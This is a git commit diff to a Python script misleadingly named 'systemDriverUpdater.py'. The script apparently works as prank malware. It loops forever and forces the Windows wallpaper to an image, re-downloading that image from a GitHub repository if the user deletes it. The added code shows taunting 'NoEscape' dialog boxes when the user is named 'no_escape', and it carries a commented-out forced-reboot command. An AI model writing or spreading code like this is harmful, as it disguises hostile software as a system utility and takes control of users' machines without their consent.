9a57677aabde7e13fe695dc5576ba9b7b9446d62
Calvin_Coolest <107697031+Calvin-CoolestYT@users.noreply.github.com>
2023-06-28 12:19:59 -0500

    Update systemDriverUpdater.py

--- systemDriverUpdater.py
+++ systemDriverUpdater.py
@@ -2,16 +2,34 @@ import requests
 import os.path
 import ctypes
 from time import sleep
+import os
+from tkinter import *
+from tkinter import messagebox
+ 
+# using getlogin() returning username
 
 
 while True:
-    
-    if os.path.isfile("C:\image.PNG") == False:
-        url = 'https://raw.githubusercontent.com/Calvin-CoolestYT/SODv2/main/image.PNG'
-        r = requests.get(url, allow_redirects=True)
-        open('C:\image.PNG', 'wb').write(r.content)
 
     ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\image.PNG", 0)
+
+    if os.getlogin() == "no_escape":
+        tof = messagebox.askquestion("NoEscape", "Do you like your computer?")
+        if tof == True:
+            messagebox.showerror("NoEscape", "Well, that's too bad.")
+        elif tof == False:
+            #os.system("shutdown -r -t 0")
+            print("ok")
+        sleep(9999)
+        
+    if os.path.isfile("C:\image.PNG") == False:
+        
+        if os.getlogin() == "no_escape":
+            pass
+        else:
+            url = 'https://raw.githubusercontent.com/Calvin-CoolestYT/SODv2/main/image.PNG'
+            r = requests.get(url, allow_redirects=True)
+            open('C:\image.PNG', 'wb').write(r.content)
 
     sleep(5)
 
